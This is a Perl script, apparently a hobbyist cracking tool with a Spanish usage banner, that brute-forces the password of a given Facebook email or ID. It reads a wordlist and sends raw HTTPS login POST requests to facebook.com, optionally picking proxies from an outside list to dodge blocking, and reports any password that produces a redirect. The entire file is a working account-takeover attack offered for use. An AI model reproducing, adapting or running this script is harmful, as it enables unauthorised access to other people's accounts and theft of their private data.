#!/usr/bin/perl
#

use strict;
use Net::SSLeay::Handle;

if(!defined($ARGV[0] && $ARGV[1])) {

print "                               Version 2.32 \n";
print "\033[1;32 \n";

print "	  88   88   .d8b.   NNNNNN  88       	88      88    88 \n";
print "	  88, ,88  d8' '8b    88    88       	88      88,  ,88  \n";
print "	  00ooo88  88ooo88    88    88       	88      00oooo88  \n";
print "	  88   88  88~~~88    88    88b      	88b     88    88  \n";
print "	  88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88  \n";

print "\033[1;31m   ======================================================\n\n\n";
print "\033[1;37m   Uso: perl $0   email / id   diccionario.txt\n\n\n\n";
print "\n";
print "\n";
print "\n";
print "\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];
my $proxy = $ARGV[2];

open (LIST, $wordlist) || die "\n[-] Can't find/open $wordlist\n";


print "                               Version 2.50 \n";
print "\033[1;32 \n";
print "	      88   88   .d8b.   NNNNNN  88       	88      88    88 \n";
print "	      88, ,88  d8' '8b    88    88       	88      88,  ,88 \n";
print "	      00ooo88  88ooo88    88    88       	88      00oooo88  \n";
print "	      88   88  88~~~88    88    88b      	88b     88    88\n";
print "	      88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88\n";

print "\033[1;31m          ================================================\n";
print "\033[1;33m                          www.facebook.com/chapuawe \n";
print "\033[1;31m          ------------------------------------------------\n";

print "\033[1;39m\n 		[+] Cracking Started on: $user ...\n\n";
print "		=======================================================\n";
print "\n\n";

use strict;
#use warnings;
use HTTP::ProxySelector;
use LWP::UserAgent;

sub proxies {
	my $selector = HTTP::ProxySelector->new(sites
	=>['http://chapuawe.webcindario.com/proxies.txt'],
	testflag => 1,
	num_tries => 10,
	testsite => 'http://www.facebook.com');
	my $ua = LWP::UserAgent->new();
	$selector->set_proxy($ua);
	print "Selected proxy: ",$selector->get_proxy(),"\n\n\n";

	my $url = "http://www.facebook.com";

	my $response = $ua->get($url) or die $!;
	my $content = $response->content() or die $!;
};

if ($proxy == "-p")
{
	proxies();
};

while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

my $a = "POST /login.php? HTTP/2.0";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/31.0 (X11; Linux x86_64) AppleWebKit/602.1.50 (KHTML, like Gecko) Chrome/53.0.2785.89 Safari/602.1.50";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr= UHMSWFpjy9bmjtkajb4ES0ed";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
 
sslfb();

sub sslfb{
	print SSL "$a\n";
	print SSL "$b\n";
	print SSL "$c\n";
	print SSL "$d\n";
	print SSL "$e\n";
	print SSL "$f\n";
	print SSL "$g\n";
	print SSL "$h\n";
	print SSL "$i\n";
	print SSL "$j\n";
	print SSL "$k\n";
	print SSL "$l\n";
	print SSL "$cookie\n\n";

	print SSL "$post\n";
}

my $limite = 50;
my $contrasenas = 0;

if ($contrasenas == $limite)
{
	sslfb();
	$limite = $limite+$contrasenas
}

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
print "\033[1;31m[-] $password -> Failed \n";
close SSL;
$contrasenas = $contrasenas+1;
}
else
{
print "\033[1;32m\n 	########################################################\n";
print "[+] \033[1;32m	Password Cracked: $password\n";
print "\033[1;32m	########################################################\n\n";
close SSL;
exit;
}
}
